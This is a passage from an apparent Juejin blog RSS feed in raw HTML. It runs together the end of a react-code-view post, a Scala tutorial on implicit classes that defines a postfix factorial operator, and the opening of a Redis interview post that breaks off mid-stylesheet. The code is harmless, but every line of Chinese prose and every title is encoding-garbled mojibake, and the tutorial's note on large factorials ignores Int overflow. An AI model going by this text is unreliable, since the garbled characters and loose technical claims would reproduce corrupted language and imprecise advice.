<h2 data-id="heading-3">4.å¯¼å…¥å¹¶ä½¿ç”¨</h2>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Demo</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./demo.md'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Demo</span> /&gt;</span></span>;
}
</code></pre>
<h2 data-id="heading-4">æœ€å¥½æ¸²æŸ“æˆçš„æ•ˆæœ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0d8d407ecfd443d8c283fd785655321~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YOt5bCP6ZOt:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671129&amp;x-signature=OE212VBypGbCqQFF0ySm3EkqtXM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">æ–‡æ¡£</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Frcv-rsuite.vercel.app%2F" target="_blank" title="https://rcv-rsuite.vercel.app/" ref="nofollow noopener noreferrer">rcv-rsuite.vercel.app/</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsimonguo%2Freact-code-view" target="_blank" title="https://github.com/simonguo/react-code-view" ref="nofollow noopener noreferrer">github.com/simonguo/reâ€¦</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¾æ—§æ˜¯éšå¼å‡½æ•°2.0]]></title>    <link>https://juejin.cn/post/7589167105386151972</link>    <guid>https://juejin.cn/post/7589167105386151972</guid>    <pubDate>2025-12-30T03:08:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589167105386151972" data-draft-id="7589201772133105705" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¾æ—§æ˜¯éšå¼å‡½æ•°2.0"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-30T03:08:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åƒé©¬é“ƒè–¯é•¿å¤§çš„åœŸè±†"/> <meta itemprop="url" content="https://juejin.cn/user/1162661349831369"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¾æ—§æ˜¯éšå¼å‡½æ•°2.0
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1162661349831369/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åƒé©¬é“ƒè–¯é•¿å¤§çš„åœŸè±†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T03:08:04.000Z" title="Tue Dec 30 2025 03:08:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">éšå¼å‡½æ•°çš„ä»£ç ç¤ºèŒƒğŸ’•æ¥ä¸‹æ¥çš„æ–‡ç« éƒ½æ˜¯è§£æè¿™ä¸ªä»£ç </h2>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> imp
<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">tt</span> </span>{
  <span class="hljs-keyword">import</span> scala.language.postfixOps
  <span class="hljs-keyword">implicit</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FactorialInt</span>(<span class="hljs-params">n: <span class="hljs-type">Int</span></span>) </span>{
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">!</span> </span>: <span class="hljs-type">Int</span> = {
      <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">1</span>) <span class="hljs-number">1</span>
      <span class="hljs-keyword">else</span> n * ((n - <span class="hljs-number">1</span>)!)
    }
  }

  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    println(<span class="hljs-number">4</span>!)
    println(<span class="hljs-number">5</span>!)
    println(<span class="hljs-number">0</span>!)
  }
}
</code></pre>
<h3 data-id="heading-1">ğŸ‘Œä¸€ã€ä»£ç æ•´ä½“ç»“æ„ &amp; æ ¸å¿ƒç›®æ ‡ğŸ˜˜</h3>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> imp  <span class="hljs-comment">// ä»£ç æ‰€å±åŒ…ï¼Œç”¨äºéš”ç¦»å‘½åç©ºé—´</span>
<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">tt</span> </span>{   <span class="hljs-comment">// å•ä¾‹å¯¹è±¡ï¼ˆScala ç¨‹åºå…¥å£å¿…é¡»åœ¨ object ä¸­ï¼‰</span>
  <span class="hljs-comment">// 1. å¯ç”¨åç¼€æ“ä½œç¬¦è¯­æ³•ï¼ˆè§£å†³!çš„ç¼–è¯‘é™åˆ¶ï¼‰</span>
  <span class="hljs-keyword">import</span> scala.language.postfixOps
  
  <span class="hljs-comment">// 2. éšå¼ç±»ï¼šä¸ºIntæ‰©å±•é˜¶ä¹˜æ–¹æ³•</span>
  <span class="hljs-keyword">implicit</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FactorialInt</span>(<span class="hljs-params">n: <span class="hljs-type">Int</span></span>) </span>{
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">!</span> </span>: <span class="hljs-type">Int</span> = {  <span class="hljs-comment">// é˜¶ä¹˜æ–¹æ³•ï¼ˆæ— å‚æ•°ï¼Œè¿”å›Intï¼‰</span>
      <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">1</span>) <span class="hljs-number">1</span>  <span class="hljs-comment">// é˜¶ä¹˜è¾¹ç•Œï¼š0!å’Œ1!éƒ½ç­‰äº1</span>
      <span class="hljs-keyword">else</span> n * ((n - <span class="hljs-number">1</span>)!)  <span class="hljs-comment">// é€’å½’è®¡ç®—é˜¶ä¹˜</span>
    }
  }

  <span class="hljs-comment">// 3. ä¸»æ–¹æ³•ï¼ˆç¨‹åºå…¥å£ï¼‰</span>
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    println(<span class="hljs-number">4</span>!)  <span class="hljs-comment">// è®¡ç®—4! = 24</span>
    println(<span class="hljs-number">5</span>!)  <span class="hljs-comment">// è®¡ç®—5! = 120</span>
    println(<span class="hljs-number">0</span>!)  <span class="hljs-comment">// è®¡ç®—0! = 1</span>
  }
}
</code></pre>
<h3 data-id="heading-2">äºŒã€å…³é”®è¯­æ³•é€è¡Œè§£æğŸ’•</h3>
<h4 data-id="heading-3">1.Â <code>import scala.language.postfixOps</code></h4>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šæ˜¾å¼å¯ç”¨ Scala çš„ã€Œåç¼€æ“ä½œç¬¦ã€ç‰¹æ€§ã€‚</li>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦</strong>ï¼šScala é»˜è®¤ç¦ç”¨Â <code>4!</code>Â è¿™ç§ â€œæ“ä½œç¬¦å†™åœ¨å˜é‡åé¢â€ çš„è¯­æ³•ï¼ˆåç¼€æ“ä½œç¬¦ï¼‰ï¼Œå› ä¸ºå®¹æ˜“å¼•å‘æ­§ä¹‰ï¼ˆæ¯”å¦‚Â <code>a b</code>Â å¯èƒ½è¢«è¯¯è§£ä¸ºÂ <code>a.b()</code>Â æˆ–Â <code>a apply b</code>ï¼‰ã€‚<code>!</code>Â åœ¨è¿™é‡Œæ˜¯è‡ªå®šä¹‰çš„åç¼€æ“ä½œç¬¦ï¼Œå¿…é¡»é€šè¿‡è¯¥å¯¼å…¥å£°æ˜å¯ç”¨ï¼Œå¦åˆ™ç¼–è¯‘æŠ¥é”™ã€‚</li>
</ul>
<h4 data-id="heading-4">2.Â <code>implicit class FactorialInt(n: Int)</code></h4>
<ul>
<li>
<p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>ï¼šéšå¼ç±»æ˜¯ Scala 2.10+ å¼•å…¥çš„è¯­æ³•ç³–ï¼Œæœ¬è´¨æ˜¯ã€Œéšå¼å‡½æ•° + æ™®é€šç±»ã€çš„ç»„åˆï¼Œä¸“é—¨ç”¨äºä¸ºç°æœ‰ç±»å‹æ‰©å±•æ–¹æ³•ã€‚</p>
</li>
<li>
<p><strong>è§„åˆ™çº¦æŸ</strong>ï¼š</p>
<ul>
<li>
<p>éšå¼ç±»å¿…é¡»å®šä¹‰åœ¨ã€Œç±» / å¯¹è±¡ / ç‰¹è´¨ã€å†…éƒ¨ï¼ˆä¸èƒ½ç›´æ¥å®šä¹‰åœ¨åŒ…ä¸‹ï¼‰ï¼›</p>
</li>
<li>
<p>æ„é€ å™¨å¿…é¡»åªæœ‰<strong>ä¸€ä¸ªå‚æ•°</strong>ï¼ˆè¿™é‡Œå‚æ•°Â <code>n: Int</code>Â å°±æ˜¯è¦æ‰©å±•çš„ç›®æ ‡ç±»å‹ï¼‰ï¼›</p>
</li>
<li>
<p>ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ä¸ºéšå¼ç±»ç”Ÿæˆä¸€ä¸ªã€Œéšå¼è½¬æ¢å‡½æ•°ã€ï¼š</p>
<p>scala</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„éšå¼å‡½æ•°ï¼ˆæ— éœ€æ‰‹åŠ¨å†™ï¼‰</span>
<span class="hljs-function">implicit def <span class="hljs-title">intToFactorialInt</span><span class="hljs-params">(n: Int)</span>: FactorialInt =</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">FactorialInt</span>(n)
</code></pre>
</li>
</ul>
</li>
</ul>
<h4 data-id="heading-5">3.Â <code>def ! : Int = { ... }</code></h4>
<ul>
<li>
<p><strong>æ–¹æ³•å®šä¹‰</strong>ï¼šå®šä¹‰äº†åä¸ºÂ <code>!</code>Â çš„æ–¹æ³•ï¼ˆæ¨¡æ‹Ÿæ•°å­¦ä¸­çš„é˜¶ä¹˜ç¬¦å·ï¼‰ï¼Œæ— å‚æ•°ã€è¿”å›å€¼ä¸ºÂ <code>Int</code>ã€‚</p>
<ul>
<li>æ³¨æ„ï¼šæ–¹æ³•åçœç•¥äº†ç©ºå‚æ•°åˆ—è¡¨Â <code>()</code>ï¼Œå› ä¸ºåç¼€æ“ä½œç¬¦è°ƒç”¨æ—¶ï¼ˆå¦‚Â <code>4!</code>ï¼‰ä¸å…è®¸å¸¦Â <code>()</code>ï¼Œè‹¥ä¿ç•™Â <code>!()</code>Â åˆ™å¿…é¡»å†™Â <code>4!()</code>ï¼Œä¸ç¬¦åˆé˜¶ä¹˜çš„ç›´è§‚å†™æ³•ã€‚</li>
</ul>
</li>
<li>
<p><strong>é˜¶ä¹˜é€»è¾‘</strong>ï¼š</p>
<ul>
<li>è¾¹ç•Œæ¡ä»¶ï¼š<code>n &lt;= 1</code>Â æ—¶è¿”å› 1ï¼ˆæ•°å­¦å®šä¹‰ï¼š<code>0! = 1</code>ã€<code>1! = 1</code>ï¼‰ï¼›</li>
<li>é€’å½’é€»è¾‘ï¼š<code>n * ((n - 1)!)</code>ï¼Œå³Â <code>n! = n Ã— (n-1)!</code>ï¼ˆæ¯”å¦‚Â <code>5! = 5 Ã— 4!</code>ï¼‰ï¼›</li>
<li>æ‹¬å·Â <code>((n - 1)!)</code>ï¼šé¿å…ä¼˜å…ˆçº§æ­§ä¹‰ï¼ˆä¹˜æ³•Â <code>*</code>Â ä¼˜å…ˆçº§é«˜äºåç¼€æ“ä½œç¬¦Â <code>!</code>ï¼ŒåŠ æ‹¬å·ç¡®ä¿å…ˆç®—Â <code>(n-1)!</code>ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-6">4.Â <code>main</code>Â æ–¹æ³•ï¼ˆç¨‹åºå…¥å£ï¼‰</h4>
<pre><code class="hljs language-scala" lang="scala">println(<span class="hljs-number">4</span>!)  <span class="hljs-comment">// ç¼–è¯‘å™¨æ‰§è¡Œçš„éšå¼è½¬æ¢æµç¨‹ï¼š</span>
<span class="hljs-comment">// 1. å‘ç° 4ï¼ˆIntç±»å‹ï¼‰æ²¡æœ‰ ! æ–¹æ³•ï¼›</span>
<span class="hljs-comment">// 2. æŸ¥æ‰¾ä½œç”¨åŸŸå†…çš„éšå¼è½¬æ¢ï¼Œæ‰¾åˆ° intToFactorialInt(4)ï¼›</span>
<span class="hljs-comment">// 3. å°† 4 è½¬æ¢ä¸º FactorialInt(4) å®ä¾‹ï¼›</span>
<span class="hljs-comment">// 4. è°ƒç”¨è¯¥å®ä¾‹çš„ ! æ–¹æ³•ï¼Œè¿”å› 24ï¼›</span>
<span class="hljs-comment">// 5. åŒç†ï¼Œ5! è¿”å› 120ï¼Œ0! è¿”å› 1ã€‚</span>
</code></pre>
<h3 data-id="heading-7">ä¸‰ã€æ‰§è¡Œç»“æœ &amp; æ ¸å¿ƒç‰¹æ€§æ€»ç»“</h3>
<h4 data-id="heading-8">1. æ‰§è¡Œç»“æœ</h4>
<pre><code class="hljs">24
120
1
</code></pre>
<h4 data-id="heading-9">2. æ ¸å¿ƒç‰¹æ€§ï¼ˆéšå¼ç±»çš„ä»·å€¼ï¼‰</h4>

























<table><thead><tr><th>ç‰¹æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æ— ä¾µå…¥æ‰©å±•</td><td>æ— éœ€ä¿®æ”¹Â <code>Int</code>Â ç±»çš„æºç ï¼ˆ<code>Int</code>Â æ˜¯ Scala åŸç”Ÿç±»ï¼Œæ— æ³•ä¿®æ”¹ï¼‰ï¼Œå®ç°æ–¹æ³•æ‰©å±•</td></tr><tr><td>è‡ªåŠ¨ç±»å‹è½¬æ¢</td><td>ç¼–è¯‘å™¨è‡ªåŠ¨å®ŒæˆÂ <code>Int â†’ FactorialInt</code>Â çš„è½¬æ¢ï¼Œè°ƒç”¨æ—¶æ— éœ€æ‰‹åŠ¨è½¬æ¢</td></tr><tr><td>è¯­æ³•ç®€æ´</td><td>ç”¨Â <code>4!</code>Â æ›¿ä»£Â <code>new FactorialInt(4).!</code>ï¼Œè´´è¿‘æ•°å­¦é˜¶ä¹˜çš„ä¹¦å†™ä¹ æƒ¯</td></tr><tr><td>ä½œç”¨åŸŸéš”ç¦»</td><td>éšå¼ç±»ä»…åœ¨Â <code>tt</code>Â å¯¹è±¡å†…ç”Ÿæ•ˆï¼Œä¸ä¼šæ±¡æŸ“å…¨å±€å‘½åç©ºé—´</td></tr></tbody></table>
<h3 data-id="heading-10">å››ã€å¸¸è§æ‰©å±• &amp; æ³¨æ„äº‹é¡¹ğŸ’•(âÂ´â—¡`â)</h3>
<h4 data-id="heading-11">1. éé€’å½’å®ç°ï¼ˆé¿å…æ ˆæº¢å‡ºï¼‰</h4>
<p>é€’å½’ç‰ˆé˜¶ä¹˜åœ¨Â <code>n</code>Â è¾ƒå¤§æ—¶ï¼ˆå¦‚Â <code>1000!</code>ï¼‰ä¼šè§¦å‘æ ˆæº¢å‡ºï¼Œå¯æ”¹ä¸ºå¾ªç¯ç‰ˆï¼š</p>
<p>scala</p>
<pre><code class="hljs language-css" lang="css">def ! : Int = {
  <span class="hljs-selector-tag">var</span> result = <span class="hljs-number">1</span>
  for (<span class="hljs-selector-tag">i</span> &lt;- <span class="hljs-number">2</span> <span class="hljs-selector-tag">to</span> n) result *= <span class="hljs-selector-tag">i</span>
  result
}
</code></pre>
<h4 data-id="heading-12">2. æ³¨æ„äº‹é¡¹</h4>
<ul>
<li>éšå¼ç±»çš„æ„é€ å™¨<strong>åªèƒ½æœ‰ä¸€ä¸ªå‚æ•°</strong>ï¼ˆå¤šå‚æ•°ä¼šç¼–è¯‘æŠ¥é”™ï¼‰ï¼›</li>
<li>åç¼€æ“ä½œç¬¦ä»…å»ºè®®ç”¨äºç›´è§‚çš„åœºæ™¯ï¼ˆå¦‚é˜¶ä¹˜Â <code>!</code>ï¼‰ï¼Œé¿å…æ»¥ç”¨å¯¼è‡´ä»£ç å¯è¯»æ€§ä¸‹é™ï¼›</li>
<li>è‹¥ä¸æƒ³å¯ç”¨Â <code>postfixOps</code>ï¼Œå¯å°†æ–¹æ³•åæ”¹ä¸ºÂ <code>factorial</code>ï¼Œè°ƒç”¨æ—¶å†™Â <code>4.factorial</code>ï¼ˆæ›´é€šç”¨ï¼‰ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[redisåŸºç¡€é¢è¯•é¢˜]]></title>    <link>https://juejin.cn/post/7589207843788275747</link>    <guid>https://juejin.cn/post/7589207843788275747</guid>    <pubDate>2025-12-30T03:49:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589207843788275747" data-draft-id="7589207843788111907" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="redisåŸºç¡€é¢è¯•é¢˜"/> <meta itemprop="keywords" content="Redis"/> <meta itemprop="datePublished" content="2025-12-30T03:49:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“ˆé‡Œè°¢é¡¿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            redisåŸºç¡€é¢è¯•é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“ˆé‡Œè°¢é¡¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T03:49:01.000Z" title="Tue Dec 30 2025 03:49:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 